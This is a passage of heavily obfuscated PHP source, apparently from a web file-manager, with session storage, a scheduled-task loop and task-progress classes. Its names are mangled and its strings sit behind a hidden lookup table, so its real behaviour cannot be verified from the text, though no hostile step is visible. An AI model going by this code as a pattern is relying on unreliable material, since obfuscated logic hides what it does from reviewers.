$¹ó¬£—¿ = array(); $Ô» ıÈ = array_to_keyvalue($çó™Ä¢[$Í‘„Ôƒ[95]], $Í‘„Ôƒ[22], $Í‘„Ôƒ[194]); $àğ´•ÌÎ = array_to_keyvalue($çó™Ä¢[$Í‘„Ôƒ[96]], $Í‘„Ôƒ[22], $Í‘„Ôƒ[194]); $¤é€ûƒµ = array_merge($àğ´•ÌÎ, $Ô» ıÈ); foreach ($Ä¬«„´± as $ñõŒü‘Ñ) { if (!in_array($ñõŒü‘Ñ, $¤é€ûƒµ)) { $¹ó¬£—¿[] = $ñõŒü‘Ñ; } } if ($¹ó¬£—¿) { $this->removeBySource($¯ûùÉ¦º, $¹ó¬£—¿); } return $çó™Ä¢; } protected function listData($­–ĞÑ‹) { $©ƒ€Š±Ë =& $_SERVER[Õò”†—·]; $ÌŞ‚çÙ® = array($©ƒ€Š±Ë[1746] => 0, $©ƒ€Š±Ë[542] => array($©ƒ€Š±Ë[2073], 0), $©ƒ€Š±Ë[480] => $©ƒ€Š±Ë[2074] . $­–ĞÑ‹); $å¾ï„»Í = $©ƒ€Š±Ë[2075]; $Ÿ¡ûò…ß = $this->field($å¾ï„»Í)->where($ÌŞ‚çÙ®)->order($©ƒ€Š±Ë[2076])->select(); return $Ÿ¡ûò…ß ? $Ÿ¡ûò…ß : array(); } protected function addToTag($¾°è”ºğ, $ñ§ˆø¥õ, $Õğ¶‰°’) { $“†¬ƒí  =& $_SERVER[Õò”†—·]; if (!$this->getByTagID($¾°è”ºğ, $Õğ¶‰°’) || !$ñ§ˆø¥õ) { return !1; } if (!Model($“†¬ƒí [875])->pathInfo($ñ§ˆø¥õ)) { return !1; } $ï’›×¤î = array($“†¬ƒí [1746] => 0, $“†¬ƒí [542] => $Õğ¶‰°’, $“†¬ƒí [479] => $ñ§ˆø¥õ, $“†¬ƒí [480] => $“†¬ƒí [2077] . $¾°è”ºğ, $“†¬ƒí [478] => $“†¬ƒí [22], $“†¬ƒí [1957] => 0); if ($this->where($ï’›×¤î)->find()) { return !1; } return $this->add($ï’›×¤î); } protected function removeFromTag($üŸ»‚†İ, $Ò”¼‘áé, $ä‘€–úˆ) { $ñõ·Šà =& $_SERVER[Õò”†—·]; if (!$this->getByTagID($üŸ»‚†İ, $ä‘€–úˆ) || !$Ò”¼‘áé) { return !1; } if (is_array($Ò”¼‘áé)) { $Ò”¼‘áé = array($ñõ·Šà[17], $Ò”¼‘áé); } $°Ã·¶ŒÔ = array($ñõ·Šà[1746] => 0, $ñõ·Šà[542] => $ä‘€–úˆ, $ñõ·Šà[480] => $ñõ·Šà[2077] . $üŸ»‚†İ, $ñõ·Šà[479] => $Ò”¼‘áé); return $this->where($°Ã·¶ŒÔ)->delete(); } protected function removeByTag($®’¦ƒ¢ı, $˜•ÜÑÆ ) { $àßè†²¥ =& $_SERVER[Õò”†—·]; if (!$this->getByTagID($®’¦ƒ¢ı, $˜•ÜÑÆ )) { return !1; } $À´Ñš—Ê = array($àßè†²¥[1746] => 0, $àßè†²¥[542] => $˜•ÜÑÆ , $àßè†²¥[480] => $àßè†²¥[2077] . $®’¦ƒ¢ı); return $this->where($À´Ñš—Ê)->delete(); } protected function removeBySource($Û‰¤¼², $ÁÑÎ‘œÜ) { $Å†ÇëúË =& $_SERVER[Õò”†—·]; if (!$Û‰¤¼² || !$ÁÑÎ‘œÜ) { return !1; } if (is_array($ÁÑÎ‘œÜ)) { $ÁÑÎ‘œÜ = array($Å†ÇëúË[17], $ÁÑÎ‘œÜ); } $¯ş·áè = array($Å†ÇëúË[1746] => 0, $Å†ÇëúË[479] => $ÁÑÎ‘œÜ, $Å†ÇëúË[542] => array($Å†ÇëúË[1064], 0), $Å†ÇëúË[480] => $Å†ÇëúË[2077] . $Û‰¤¼²); return $this->where($¯ş·áè)->delete(); } } goto a©§¾°ª‰; aÏ§æç¾ˆ³: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ëà‰¼ÍÎ =& $_SERVER[Õò”†—·]; static $Ï˜˜˜ıæ = false; if ($Ï˜˜˜ıæ) { return $Ï˜˜˜ıæ; } $úßï”í¤ = $GLOBALS[$ëà‰¼ÍÎ[16]][$ëà‰¼ÍÎ[409]]; self::$sessionTime = $úßï”í¤[$ëà‰¼ÍÎ[1701]]; $ÚÙ¥Æ•º = isset($GLOBALS[$ëà‰¼ÍÎ[1702]]) ? $GLOBALS[$ëà‰¼ÍÎ[1702]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÚÙ¥Æ•º)) { self::$sessionSign = Cookie::get($ÚÙ¥Æ•º); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÚÙ¥Æ•º, self::$sessionSign, self::$sessionTime); $ÜÆÀÃ±È = $úßï”í¤[$ëà‰¼ÍÎ[1703]]; $¯ç¥»›‹ = $úßï”í¤[$ÜÆÀÃ±È]; $™¤È§³¡ = $úßï”í¤[$ëà‰¼ÍÎ[878]]; switch ($ÜÆÀÃ±È) { case $ëà‰¼ÍÎ[31]: self::$handle = Model($ëà‰¼ÍÎ[879]); break; case $ëà‰¼ÍÎ[880]: self::$handle = new CacheRedis($¯ç¥»›‹, $™¤È§³¡); break; case $ëà‰¼ÍÎ[881]: self::$handle = new CacheMemcached($¯ç¥»›‹, $™¤È§³¡); break; case $ëà‰¼ÍÎ[231]: $¯ç¥»›‹[$ëà‰¼ÍÎ[97]] = $¯ç¥»›‹[$ëà‰¼ÍÎ[97]] . $ëà‰¼ÍÎ[1704]; self::$handle = new CacheFile($¯ç¥»›‹, $™¤È§³¡); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ï˜˜˜ıæ = new self(); return $Ï˜˜˜ıæ; } public static function getBySign($ æå¬„) { $³®¹úÆğ = self::$handle->get($ æå¬„); $³®¹úÆğ = unserialize($³®¹úÆğ); return is_array($³®¹úÆğ) ? $³®¹úÆğ : array(); } public static function setBySign($½Ä¬‰ş›, $ˆˆ§³Šõ) { CacheLock::lock($½Ä¬‰ş›); self::$handle->set($½Ä¬‰ş›, serialize($ˆˆ§³Šõ), self::$sessionTime); CacheLock::unlock($½Ä¬‰ş›); } public static function sign($šìè—Ûõ = false) { if ($šìè—Ûõ) { self::$sessionSign = $šìè—Ûõ; } self::init(); return self::$sessionSign; } public static function set($¹ÆéÉ€, $ĞŒ˜ä´È = false) { self::init(); if (is_array($¹ÆéÉ€)) { foreach ($¹ÆéÉ€ as $«ùâßïÑ => $ Œë¾­Š) { array_set_value(self::$data, $«ùâßïÑ, $ Œë¾­Š); } } else { array_set_value(self::$data, $¹ÆéÉ€, $ĞŒ˜ä´È); } self::setBySign(self::$sessionSign, self::$data); } public static function get($…ËÆª·„ = false) { self::init(); if (!$…ËÆª·„) { return self::$data; } return array_get_value(self::$data, $…ËÆª·„); } public static function remove($£â×¯ ) { self::init(); unset(self::$data[$£â×¯ ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Õò”†—·][884])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¥şİø†ü =& $_SERVER[Õò”†—·]; if (self::valueGet($¥şİø†ü[801]) != $¥şİø†ü[101]) { return; } if (self::valueGet($¥şİø†ü[1705]) == $¥şİø†ü[101]) { $ÚÆÅöÒ¢ = self::valueGet($¥şİø†ü[1706]); if (time() - $ÚÆÅöÒ¢ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¥şİø†ü[1705], $¥şİø†ü[101]); self::log($¥şİø†ü[1707] . ACTION . $¥şİø†ü[1708]); Hook::bind($¥şİø†ü[1709], $¥şİø†ü[1710]); $°ºÊŒ­¿ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¥şİø†ü[801]) != $¥şİø†ü[101]) { self::valueSet($¥şİø†ü[1705], $¥şİø†ü[229]); self::log($¥şİø†ü[1711]); die; } $ªŞš”˜Ú = time(); if ($ªŞš”˜Ú - $°ºÊŒ­¿ >= 60) { self::valueSet(array($¥şİø†ü[1705] => $¥şİø†ü[101], $¥şİø†ü[1706] => $ªŞš”˜Ú)); $°ºÊŒ­¿ = $ªŞš”˜Ú; } if (!file_exists(USER_SYSTEM . $¥şİø†ü[1712])) { self::valueSet(array($¥şİø†ü[1705] => $¥şİø†ü[229], $¥şİø†ü[801] => $¥şİø†ü[229])); self::log($¥şİø†ü[1713]); die; } $¤ŸÁø¬ = file_get_contents(BASIC_PATH . $¥şİø†ü[1714]); $¿ìÚø­ß = KOD_VERSION . $¥şİø†ü[20] . KOD_VERSION_BUILD; $½şÅ¦Ã = match_text($¤ŸÁø¬, $¥şİø†ü[1715]) . $¥şİø†ü[20] . match_text($¤ŸÁø¬, $¥şİø†ü[1716]); if ($½şÅ¦Ã != $¿ìÚø­ß) { self::restart(); self::log("\163\164\157\x70\x65\144\x2e\x5b\166\145\162\163\x69\157\x6e\40\165\x70\144\x61\164\145\73{$versionNow}\x20\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $×‘š¸˜Ù =& $_SERVER[Õò”†—·]; http_close(); $GLOBALS[$×‘š¸˜Ù[1717]] = 1; $_SERVER[$×‘š¸˜Ù[1718]] = $×‘š¸˜Ù[1719]; $_COOKIE = array(); $GLOBALS[$×‘š¸˜Ù[1720]] = 1; $GLOBALS[$×‘š¸˜Ù[1721]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÖÕ®õå =& $_SERVER[Õò”†—·]; http_close(); self::valueSet($ÖÕ®õå[801], $ÖÕ®õå[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÖÕ®õå[1705] => $ÖÕ®õå[229], $ÖÕ®õå[801] => $ÖÕ®õå[101])); self::log($ÖÕ®õå[1722]); } public static function taskSwitch() { $æÏ˜í‰™ =& $_SERVER[Õò”†—·]; $ıŞ²‘æñ = self::valueGet($æÏ˜í‰™[801]) == $æÏ˜í‰™[101] ? $æÏ˜í‰™[229] : $æÏ˜í‰™[101]; self::valueSet($æÏ˜í‰™[801], $ıŞ²‘æñ); } public static function shutdownEvent() { $¢éÄß’² =& $_SERVER[Õò”†—·]; self::valueSet($¢éÄß’²[1705], $¢éÄß’²[229]); self::log($¢éÄß’²[1723]); } public static function config($“¨·±Ôú, $ŸĞòƒÔÏ) { self::valueSet($_SERVER[Õò”†—·][801], $“¨·±Ôú); } private static function taskRunAll() { $–à§š„î =& $_SERVER[Õò”†—·]; $½Ê¸çÂ” = timeFloat(); $ÍËÅİ…ò = Model($–à§š„î[1724])->listData(); $¥›Ğ»œ = count($ÍËÅİ…ò); for ($¾ÕÀ©â = 0; $¾ÕÀ©â < $¥›Ğ»œ; $¾ÕÀ©â++) { $öí·Æ÷  = $ÍËÅİ…ò[$¾ÕÀ©â]; if (!$öí·Æ÷ [$–à§š„î[459]] || $öí·Æ÷ [$–à§š„î[1725]] != $–à§š„î[101]) { continue; } if (!self::taskTimeCheck($öí·Æ÷ )) { continue; } self::taskRun($öí·Æ÷ ); } Hook::trigger($–à§š„î[1726]); self::taskQueueRun($½Ê¸çÂ”); } private static function taskQueueRun($Ë¹æö’¢) { $Ÿš´šû¯ = 10; while (!0) { $ß–òò÷ = TaskQueue::run(); if ($ß–òò÷ === !1) { break; } if (timeFloat() - $Ë¹æö’¢ >= $Ÿš´šû¯) { break; } } } private static function taskTimeCheck($±À”ÇÖÏ) { $óß“ĞëŞ =& $_SERVER[Õò”†—·]; $ù€£ÏŠ = json_decode($±À”ÇÖÏ[$óß“ĞëŞ[207]], !0); $ÚÜÃÓ¤¨ = intval($±À”ÇÖÏ[$óß“ĞëŞ[1706]]); $ô®Òåñ¨ = strtotime($óß“ĞëŞ[1727] . $ù€£ÏŠ[$óß“ĞëŞ[1728]] . $óß“ĞëŞ[1729]) - strtotime($óß“ĞëŞ[1730]); $ÎùÀ•™ = time() - strtotime(date($óß“ĞëŞ[1731]) . $óß“ĞëŞ[1732]); $†Œµ ø = $ÎùÀ•™ >= $ô®Òåñ¨ && $ÎùÀ•™ <= $ô®Òåñ¨ + 3600; switch ($ù€£ÏŠ[$óß“ĞëŞ[43]]) { case $óß“ĞëŞ[1733]: if (time() - $ÚÜÃÓ¤¨ < 3600 * 24 * 30) { return !1; } if ($ù€£ÏŠ[$óß“ĞëŞ[1733]] == date($óß“ĞëŞ[1734]) && $†Œµ ø) { return !0; } break; case $óß“ĞëŞ[1735]: if (time() - $ÚÜÃÓ¤¨ < 3600 * 24 * 7) { return !1; } $¬›¤¯Š³ = date($óß“ĞëŞ[1736]) == 0 ? 7 : date($óß“ĞëŞ[1736]); if ($ù€£ÏŠ[$óß“ĞëŞ[1735]] == $¬›¤¯Š³ && $†Œµ ø) { return !0; } break; case $óß“ĞëŞ[1728]: if (time() - $ÚÜÃÓ¤¨ < 3600 * 24) { return !1; } if ($†Œµ ø) { return !0; } break; case $óß“ĞëŞ[1737]: if (time() - $ÚÜÃÓ¤¨ >= floatval($ù€£ÏŠ[$óß“ĞëŞ[1737]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $•µ¿£Î =& $_SERVER[Õò”†—·]; static $àÄÄ¹´¨ = 0; $ÕøÃÄ±¸ = 300; if (!$àÄÄ¹´¨) { $àÄÄ¹´¨ = time(); } if (time() - $àÄÄ¹´¨ < $ÕøÃÄ±¸) { return; } $àÄÄ¹´¨ = time(); $¯ĞùÛ¾ö = Model($•µ¿£Î[562])->db($•µ¿£Î[22]); if ($¯ĞùÛ¾ö) { $¯ĞùÛ¾ö->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($•µ¿£Î[1738], $•µ¿£Î[1739]); die; } } public static function taskRun($Ò¨ÎÌôì) { $Ø‹¿–Æˆ =& $_SERVER[Õò”†—·]; self::log($Ø‹¿–Æˆ[1740] . $Ò¨ÎÌôì[$Ø‹¿–Æˆ[459]] . $Ø‹¿–Æˆ[1741] . $Ò¨ÎÌôì[$Ø‹¿–Æˆ[42]] . $Ø‹¿–Æˆ[1742] . $Ò¨ÎÌôì[$Ø‹¿–Æˆ[1743]]); Model($Ø‹¿–Æˆ[1724])->run($Ò¨ÎÌôì[$Ø‹¿–Æˆ[459]]); $ğşÀ§Æé = timeFloat(); $Ç¤ßÊá = $Ø‹¿–Æˆ[22]; switch ($Ò¨ÎÌôì[$Ø‹¿–Æˆ[43]]) { case $Ø‹¿–Æˆ[367]: $•„„†í = url_request($Ò¨ÎÌôì[$Ø‹¿–Æˆ[1743]], $Ø‹¿–Æˆ[262], !1, !1, !1, !1, 10); if ($•„„†í[$Ø‹¿–Æˆ[801]]) { $Ç¤ßÊá = strlen($•„„†í[$Ø‹¿–Æˆ[1256]]); } break; case $Ø‹¿–Æˆ[261]: $Ç¤ßÊá = Hook::apply($Ò¨ÎÌôì[$Ø‹¿–Æˆ[1743]]); default: break; } Model($Ø‹¿–Æˆ[1744])->add(array($Ø‹¿–Æˆ[1745] => $Ø‹¿–Æˆ[22], $Ø‹¿–Æˆ[1746] => $Ø‹¿–Æˆ[229], $Ø‹¿–Æˆ[43] => $Ø‹¿–Æˆ[1747] . $Ò¨ÎÌôì[$Ø‹¿–Æˆ[459]], $Ø‹¿–Æˆ[1748] => json_encode(array($Ø‹¿–Æˆ[42] => $Ò¨ÎÌôì[$Ø‹¿–Æˆ[42]], $Ø‹¿–Æˆ[1749] => timeFloat() - $ğşÀ§Æé, $Ø‹¿–Æˆ[353] => $Ç¤ßÊá)))); $…ŞÕ½ş = $Ç¤ßÊá ? $Ø‹¿–Æˆ[1750] . $Ç¤ßÊá : $Ø‹¿–Æˆ[22]; self::log($Ø‹¿–Æˆ[1751] . $Ò¨ÎÌôì[$Ø‹¿–Æˆ[459]] . $Ø‹¿–Æˆ[178] . $…ŞÕ½ş); return !0; } public static function valueGet($¤Ğğ¾›) { $˜Â´¶Çò =& $_SERVER[Õò”†—·]; $°´¿¦äË = $˜Â´¶Çò[1752]; $à¡ş»î = Model($˜Â´¶Çò[492])->get($¤Ğğ¾›, $°´¿¦äË); if (is_null($à¡ş»î)) { Model($˜Â´¶Çò[492])->set($˜Â´¶Çò[801], $˜Â´¶Çò[101], $°´¿¦äË); Model($˜Â´¶Çò[492])->set($˜Â´¶Çò[1705], $˜Â´¶Çò[229], $°´¿¦äË); $à¡ş»î = Model($˜Â´¶Çò[492])->get($¤Ğğ¾›, $°´¿¦äË); } return $à¡ş»î; } private static function valueSet($Ì¡¥•ü˜, $ÚáÕ£Ö = false) { $˜‡äÇÉ— =& $_SERVER[Õò”†—·]; $éÙÖûÎÖ = $˜‡äÇÉ—[1753]; CacheLock::lock($éÙÖûÎÖ); $Ê‹ıœü = Model($˜‡äÇÉ—[492])->set($Ì¡¥•ü˜, $ÚáÕ£Ö, $˜‡äÇÉ—[1752]); CacheLock::unlock($éÙÖûÎÖ); return $Ê‹ıœü; } protected static function log($ï¼ê‹êÅ) { write_log($ï¼ê‹êÅ, $_SERVER[Õò”†—·][1739]); } private static function cacheClear() { $’ã™«ƒ =& $_SERVER[Õò”†—·]; Cache::clearMemory(Model($’ã™«ƒ[492])->cacheKey($’ã™«ƒ[1752])); Cache::clearMemory(Model($’ã™«ƒ[492])->cacheKey($’ã™«ƒ[1754])); Model($’ã™«ƒ[1724])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\x75\156\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÙûşÊ¢ş, $åÌ¸§œá = '', $€êó¤¾ñ = 0, $è®ûÚÚ = '') { $‚ò³‚Í¶ =& $_SERVER[Õò”†—·]; if (self::get($ÙûşÊ¢ş)) { return; } $this->task = array($‚ò³‚Í¶[459] => $ÙûşÊ¢ş, $‚ò³‚Í¶[1755] => USER_ID, $‚ò³‚Í¶[1643] => $è®ûÚÚ, $‚ò³‚Í¶[510] => $‚ò³‚Í¶[22], $‚ò³‚Í¶[43] => $åÌ¸§œá, $‚ò³‚Í¶[1115] => $‚ò³‚Í¶[22], $‚ò³‚Í¶[1113] => $€êó¤¾ñ, $‚ò³‚Í¶[1756] => 0, $‚ò³‚Í¶[1757] => 0, $‚ò³‚Í¶[1758] => 0, $‚ò³‚Í¶[1759] => timeFloat(), $‚ò³‚Í¶[1760] => 0, $‚ò³‚Í¶[1761] => 0, $‚ò³‚Í¶[1762] => 0, $‚ò³‚Í¶[1763] => 0, $‚ò³‚Í¶[801] => $‚ò³‚Í¶[1705]); $GLOBALS[$‚ò³‚Í¶[1764]] = 1; Hook::bind($‚ò³‚Í¶[1709], array($this, $‚ò³‚Í¶[1765])); Hook::bind($‚ò³‚Í¶[1766], array($this, $‚ò³‚Í¶[1767])); $this->startAfter(); Hook::trigger($‚ò³‚Í¶[1768], $this->task); $this->task[$‚ò³‚Í¶[1761]] = timeFloat(); } public function end($‰›—¸ = '') { $ÔÇÆüÔ =& $_SERVER[Õò”†—·]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÔÇÆüÔ[1761]]) { self::valueSet($this->task[$ÔÇÆüÔ[459]], !1); } $this->isEnd = !0; if ($‰›—¸) { $this->task[$ÔÇÆüÔ[510]] = $‰›—¸; } self::log($ÔÇÆüÔ[1769] . $this->task[$ÔÇÆüÔ[459]] . $ÔÇÆüÔ[1770] . sprintf($ÔÇÆüÔ[901], timeFloat() - $this->task[$ÔÇÆüÔ[1759]]) . $ÔÇÆüÔ[1771]); Hook::unbind($ÔÇÆüÔ[1709], array($this, $ÔÇÆüÔ[1765])); Hook::unbind($ÔÇÆüÔ[1766], array($this, $ÔÇÆüÔ[1767])); $this->endAfter(); $ãÔÇÆØ = $this->task; $this->task = !1; Hook::trigger($ÔÇÆüÔ[1772], $ãÔÇÆØ); } public function update($âó€äéÔ = 0, $çÜ’à„Á = false) { $¬ì“Ó×Ñ =& $_SERVER[Õò”†—·]; $ä £Ş–ß =& $this->task; if (!$ä £Ş–ß) { return; } $ä £Ş–ß[$¬ì“Ó×Ñ[1756]] += $âó€äéÔ; $ä £Ş–ß[$¬ì“Ó×Ñ[1760]] = timeFloat(); if ($ä £Ş–ß[$¬ì“Ó×Ñ[1113]]) { if ($ä £Ş–ß[$¬ì“Ó×Ñ[1113]] < $ä £Ş–ß[$¬ì“Ó×Ñ[1756]]) { $ä £Ş–ß[$¬ì“Ó×Ñ[1113]] = $ä £Ş–ß[$¬ì“Ó×Ñ[1756]]; } $°†„¶§· = timeFloat() - $ä £Ş–ß[$¬ì“Ó×Ñ[1759]] - $ä £Ş–ß[$¬ì“Ó×Ñ[1762]]; if ($°†„¶§· <= 0) { $°†„¶§· = 0.001; } $ä £Ş–ß[$¬ì“Ó×Ñ[1757]] = $ä £Ş–ß[$¬ì“Ó×Ñ[1756]] / $ä £Ş–ß[$¬ì“Ó×Ñ[1113]]; $ä £Ş–ß[$¬ì“Ó×Ñ[1758]] = $ä £Ş–ß[$¬ì“Ó×Ñ[1756]] / $°†„¶§·; if ($ä £Ş–ß[$¬ì“Ó×Ñ[1757]] > 0) { $ä £Ş–ß[$¬ì“Ó×Ñ[1763]] = $°†„¶§· * (1 - $ä £Ş–ß[$¬ì“Ó×Ñ[1757]]) / $ä £Ş–ß[$¬ì“Ó×Ñ[1757]]; } $ä £Ş–ß[$¬ì“Ó×Ñ[1763]] = $ä £Ş–ß[$¬ì“Ó×Ñ[1763]] <= 0 ? 0 : $ä £Ş–ß[$¬ì“Ó×Ñ[1763]]; } $this->updateAfter(); $¢êĞ¨™ = 0.2; if (timeFloat() - $ä £Ş–ß[$¬ì“Ó×Ñ[1761]] < $¢êĞ¨™ && !$çÜ’à„Á) { return; } $š¡¦Ó = self::get($ä £Ş–ß[$¬ì“Ó×Ñ[459]]); $·£Ü‚è¹ = $š¡¦Ó[$¬ì“Ó×Ñ[801]]; if ($·£Ü‚è¹ == self::STATYS_KILL) { $ûâ–°“Ë = array($¬ì“Ó×Ñ[1773] => LNG($¬ì“Ó×Ñ[1774]), $¬ì“Ó×Ñ[1266] => !1); Cache::set($¬ì“Ó×Ñ[1775] . $this->task[$¬ì“Ó×Ñ[459]], $ûâ–°“Ë, 30); $this->onKill(); $this->end(); die; } else { if ($·£Ü‚è¹ == self::STATYS_STOP) { $Í¬£•² = 2; $š¡¦Ó[$¬ì“Ó×Ñ[1762]] += $Í¬£•²; self::valueSet($ä £Ş–ß[$¬ì“Ó×Ñ[459]], $š¡¦Ó); sleep($Í¬£•²); $this->update(); return; } } $ä £Ş–ß[$¬ì“Ó×Ñ[801]] = $·£Ü‚è¹ ? $·£Ü‚è¹ : $ä £Ş–ß[$¬ì“Ó×Ñ[801]]; $ä £Ş–ß[$¬ì“Ó×Ñ[1762]] = $š¡¦Ó[$¬ì“Ó×Ñ[1762]] ? $š¡¦Ó[$¬ì“Ó×Ñ[1762]] : 0; $ä £Ş–ß[$¬ì“Ó×Ñ[1761]] = timeFloat(); Hook::trigger($¬ì“Ó×Ñ[1776], $ä £Ş–ß); self::valueSet($ä £Ş–ß[$¬ì“Ó×Ñ[459]], $ä £Ş–ß); } public function onKillSet($¢¡×œ•Ğ, $Âç¸ñ– = array()) { $this->onKillCall = array($¢¡×œ•Ğ, $Âç¸ñ–); } public function onKill() { $¡ïä¸ã… =& $_SERVER[Õò”†—·]; self::log($¡ïä¸ã…[1769] . $this->task[$¡ïä¸ã…[459]] . $¡ïä¸ã…[1777]); Hook::trigger($¡ïä¸ã…[1778], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¥®ıì¼¯) { $í©Ó«íí =& $_SERVER[Õò”†—·]; Cache::set($í©Ó«íí[1775] . $this->task[$í©Ó«íí[459]], $¥®ıì¼¯, 60); return $¥®ıì¼¯; } public static function get($±úÆç‹) { $ë¯ËåÈŠ =& $_SERVER[Õò”†—·]; $ı»Üæà¤ = self::valueGet($±úÆç‹); if (is_array($ı»Üæà¤) && $ı»Üæà¤[$ë¯ËåÈŠ[1779]]) { $Õğ§ğ¨ = ActionApply($ı»Üæà¤[$ë¯ËåÈŠ[1779]], array($ı»Üæà¤)); $ı»Üæà¤ = is_array($Õğ§ğ¨) ? $Õğ§ğ¨ : $ı»Üæà¤; } return $ı»Üæà¤; } public static function listData() { $¦›–Ê¶œ = self::valueGet(); return array_sort_by($¦›–Ê¶œ, $_SERVER[Õò”†—·][1759], !0); } public static function kill($È°¤¬Äé) { return self::changeStatus($È°¤¬Äé, self::STATYS_KILL); } public static function stop($úÂ…û¼ï) { return self::changeStatus($úÂ…û¼ï, self::STATYS_STOP); } public static function restart($ŠñíÇÖÅ) { return self::changeStatus($ŠñíÇÖÅ, self::STATYS_RUNNING); } public static function killAll() { $§ÉôÎ¤Ç =& $_SERVER[Õò”†—·]; $ìâ» ± = self::listData(); foreach ($ìâ» ± as $ß¡–Ãù©) { self::kill($ß¡–Ãù©[$§ÉôÎ¤Ç[459]]); } sleep(2); foreach ($ìâ» ± as $ß¡–Ãù©) { self::valueSet($ß¡–Ãù©[$§ÉôÎ¤Ç[459]], !1); } } private static function changeStatus($œ–²Œ , $´çƒîÕĞ) { $É—Äœ“ =& $_SERVER[Õò”†—·]; $ªæÖ–Œ = self::valueGet($œ–²Œ ); if (!$ªæÖ–Œ) { return !1; } $ªæÖ–Œ[$É—Äœ“[801]] = $´çƒîÕĞ; self::valueSet($œ–²Œ , $ªæÖ–Œ); self::log($É—Äœ“[1780] . $ªæÖ–Œ[$É—Äœ“[459]] . $É—Äœ“[1781] . $´çƒîÕĞ); return !0; } public static function valueGet($İì…âÓÜ = false) { $º‘ûû­» =& $_SERVER[Õò”†—·]; if ($İì…âÓÜ) { $Ô¤·°è— = Model($º‘ûû­»[504])->where(array($º‘ûû­»[107] => $İì…âÓÜ, $º‘ûû­»[43] => $º‘ûû­»[1122]))->find(); return $Ô¤·°è— ? json_decode($Ô¤·°è—[$º‘ûû­»[434]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¸ô—÷Ùù = false) { $„‚ÅÁ»ï =& $_SERVER[Õò”†—·]; $Á¾Œ½Ì¦ = array($„‚ÅÁ»ï[43] => $„‚ÅÁ»ï[1122]); if ($¸ô—÷Ùù) { $Á¾Œ½Ì¦[$„‚ÅÁ»ï[1755]] = $¸ô—÷Ùù; } $Ü³†šÜ = Model($„‚ÅÁ»ï[504])->where($Á¾Œ½Ì¦)->select(); $Ü³†šÜ = $Ü³†šÜ ? $Ü³†šÜ : array(); foreach ($Ü³†šÜ as $¬çıÏ‡— => $¶¡ÕüÌ) { $Ü³†šÜ[$¬çıÏ‡—] = json_decode($¶¡ÕüÌ[$„‚ÅÁ»ï[434]], !0); } return $Ü³†šÜ; } public static function valueSet($ÈÍ½öÈº, $À§®ÛãÑ) { $ÄŸáÌÍç =& $_SERVER[Õò”†—·]; if (!$À§®ÛãÑ) { return Model($ÄŸáÌÍç[504])->where(array($ÄŸáÌÍç[107] => $ÈÍ½öÈº, $ÄŸáÌÍç[43] => $ÄŸáÌÍç[1122]))->delete(); } $İŸäœ¬ = json_encode($À§®ÛãÑ); if (!$İŸäœ¬) { ob_start(); var_dump($À§®ÛãÑ); $œ™‚“­Û = ob_get_clean(); self::log($ÄŸáÌÍç[1782] . json_encode_force($œ™‚“­Û)); } if (!$ÈÍ½öÈº || !$À§®ÛãÑ[$ÄŸáÌÍç[459]]) { return !1; } $ŞØŞ›û¤ = array($ÄŸáÌÍç[43] => $ÄŸáÌÍç[1122], $ÄŸáÌÍç[1755] => USER_ID, $ÄŸáÌÍç[107] => $ÈÍ½öÈº, $ÄŸáÌÍç[434] => $İŸäœ¬); $ï·Îº = $ÄŸáÌÍç[1783]; CacheLock::lock($ï·Îº); Model($ÄŸáÌÍç[504])->add($ŞØŞ›û¤, array(), !0); CacheLock::unlock($ï·Îº); } public static function log($»´ù¬õÃ) { if (!GLOBAL_DEBUG) { return; } write_log($»´ù¬õÃ, $_SERVER[Õò”†—·][1784]); } } goto c¿”…»ğ÷; Eˆøœ¶éĞ—: define($_SERVER[Õò”†—·][299], 1); define($_SERVER[Õò”†—·][300], 2); define($_SERVER[Õò”†—·][301], 3); goto B¶Ãª«ñÚ­; c¿”…»ğ÷: class TaskFileTransfer extends Task { protected function startAfter() { $èª½øÛğ =& $_SERVER[Õò”†—·]; $”‚Š˜ü =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($èª½øÛğ[1785], array($this, $èª½øÛğ[1786])); Hook::bind($èª½øÛğ[1277], array($this, $èª½øÛğ[1787])); Hook::bind($èª½øÛğ[1788], array($this, $èª½øÛğ[1789])); Hook::bind($èª½øÛğ[652], array($this, $èª½øÛğ[1790])); Hook::bind($èª½øÛğ[653], array($this, $èª½øÛğ[1791])); Hook::bind($èª½øÛğ[659], array($this, $èª½øÛğ[1792])); Hook::bind($èª½øÛğ[660], array($this, $èª½øÛğ[1793])); Hook::bind($èª½øÛğ[655], array($this, $èª½øÛğ[1794])); Hook::bind($èª½øÛğ[657], array($this, $èª½øÛğ[1795])); Hook::bind($èª½øÛğ[621], array($this, $èª½øÛğ[1796])); Hook::bind($èª½øÛğ[618], array($this, 